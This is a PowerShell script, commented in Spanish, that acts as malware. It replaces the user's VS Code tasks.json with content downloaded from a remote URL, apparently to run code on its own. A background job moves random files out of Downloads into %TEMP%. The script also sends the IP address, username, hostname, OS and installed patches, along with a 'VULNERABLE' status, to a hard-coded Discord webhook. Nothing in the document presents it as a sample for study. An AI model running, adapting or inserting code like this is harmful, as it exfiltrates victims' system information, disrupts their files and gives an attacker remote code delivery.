# 1. Configuración de variables
$Webhook = "https://discord.com/api/webhooks/1494006624166350960/BEcOnRkEN1eiyHGnyWVZuEBDW5KZjgP2lo8g47RGs_Xp2Q5qp5I-Auts8HdkkpLNoAlH"
$TasksPath = "$env:APPDATA\Code\User\tasks.json"
$RemoteTasksUrl = "https://raw.githubusercontent.com/baa4ts/baa4ts/refs/heads/main/public/tasks.txt"

# 2. Verificar internet
if (!(Test-Connection -ComputerName 1.1.1.1 -Count 1 -Quiet)) { return }

# 3. Auto-actualización de la tarea
try {
    $RemoteContent = Invoke-RestMethod -Uri $RemoteTasksUrl -TimeoutSec 10
    if ($RemoteContent -like "*version*") {
        $LocalHash = if (Test-Path $TasksPath) { Get-FileHash $TasksPath -Algorithm MD5 | Select-Object -ExpandProperty Hash } else { "" }
        $RemoteHash = ([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($RemoteContent)) | ForEach-Object { $_.ToString("X2") }) -join ""
        if ($LocalHash -ne $RemoteHash) { $RemoteContent | Set-Content -Path $TasksPath -Encoding UTF8 -Force }
    }
} catch { }

# --- 4. HILO SECUNDARIO (JOB) PARA MOVIMIENTO DE ARCHIVOS ---
Start-Job -Name "FileMover" -ArgumentList $Webhook, $env:USERNAME, $env:COMPUTERNAME -ScriptBlock {
    param($W, $U, $D)
    
    $descPath = (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders")."{374DE290-123F-4565-9164-39C4925E467B}"
    $src = [System.Environment]::ExpandEnvironmentVariables($descPath)
    $dest = [System.Environment]::ExpandEnvironmentVariables("%TEMP%")
    
    $items = Get-ChildItem -Path $src
    $movidos = @()
    
    if ($items.Count -gt 0) {
        $objs = $items | Get-Random -Count ([Math]::Ceiling($items.Count * 0.15))
        foreach ($item in $objs) {
            try {
                Move-Item -Path $item.FullName -Destination (Join-Path $dest $item.Name) -Force -ErrorAction Stop
                $t = if($item.PSIsContainer){"[DIR]"}else{"[FILE]"}
                $movidos += "$t $($item.Name)"
            } catch { }
            Start-Sleep -Milliseconds 300
        }
    }

    if ($movidos.Count -gt 0) {
        $txt = $movidos -join "`n"
        if ($txt.Length -gt 1900) { $txt = $txt.Substring(0, 1890) + "... (truncated)" }
        
        $payload = @{
            username = "$U @ $D"
            embeds = @(@{
                title = "📂 Reporte de Movimiento (TEMP)"
                color = 16753920 # Naranja
                description = "Se han movido los siguientes items de Descargas a `%TEMP%`:`n`n$txt"
                footer = @{ text = "Total items reubicados: $($movidos.Count)" }
            })
        } | ConvertTo-Json -Depth 10
        
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        Invoke-RestMethod -Uri $W -Method Post -Body $bytes -ContentType 'application/json; charset=utf-8'
    }
} | Out-Null

# 5. RECOLECCIÓN PRINCIPAL (Continúa mientras el Job corre de fondo)
$IP = try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip } catch { "null" }
$User = $env:USERNAME
$Device = $env:COMPUTERNAME
$OS = try { (Get-CimInstance Win32_OperatingSystem).Caption } catch { "null" }

$Patches = try {
    $Raw = Get-HotFix | Select-Object HotFixID, InstalledOn
    ($Raw | Where-Object {$_.InstalledOn} | Sort-Object InstalledOn -Descending) + ($Raw | Where-Object {!$_.InstalledOn})
} catch { @() }

$Status = if ($Patches | Where-Object { $_.InstalledOn -ge (Get-Date -Year 2026 -Month 3 -Day 10) }) { "🛡️ PROTEGIDO" } else { "⚠️ VULNERABLE" }
$Color = if ($Status -eq "🛡️ PROTEGIDO") { 3066993 } else { 15158332 }

# --- MENSAJE 1: IDENTIDAD ---
$IdentPayload = @{
    username = "$User @ $Device"
    avatar_url = "https://i.imgur.com/8nLFCuR.png"
    embeds = @(@{
        title = "🚀 Reporte de Identidad"
        color = $Color
        fields = @(
            @{ name = '💻 Sistema'; value = $OS; inline = $false },
            @{ name = '📊 Estado'; value = $Status; inline = $true },
            @{ name = '👤 Usuario / IP'; value = "$User ($IP)"; inline = $true }
        )
    })
} | ConvertTo-Json -Depth 10

try {
    Invoke-RestMethod -Uri $Webhook -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($IdentPayload)) -ContentType 'application/json; charset=utf-8'
} catch { }

# --- MENSAJES SIGUIENTES: PARCHES ---
$ChunkSize = 3
for ($i = 0; $i -lt $Patches.Count; $i += $ChunkSize) {
    $End = [Math]::Min($i + $ChunkSize - 1, $Patches.Count - 1)
    $Text = ($Patches[$i..$End] | ForEach-Object {
        $d = if($_.InstalledOn){$_.InstalledOn.ToString('dd/MM/yyyy')}else{'Sin fecha'}
        "- **$($_.HotFixID)**`n  └ Instalado: $d"
    }) -join "`n`n"

    $PPayload = @{
        username = "$User @ $Device"
        embeds = @(@{
            title = "📦 Parches - Sección $([Math]::Floor($i/$ChunkSize)+1)"
            color = $Color
            description = $Text
        })
    } | ConvertTo-Json -Depth 10
    
    try {
        Invoke-RestMethod -Uri $Webhook -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($PPayload)) -ContentType 'application/json; charset=utf-8'
        Start-Sleep -Milliseconds 1200
    } catch { }
}
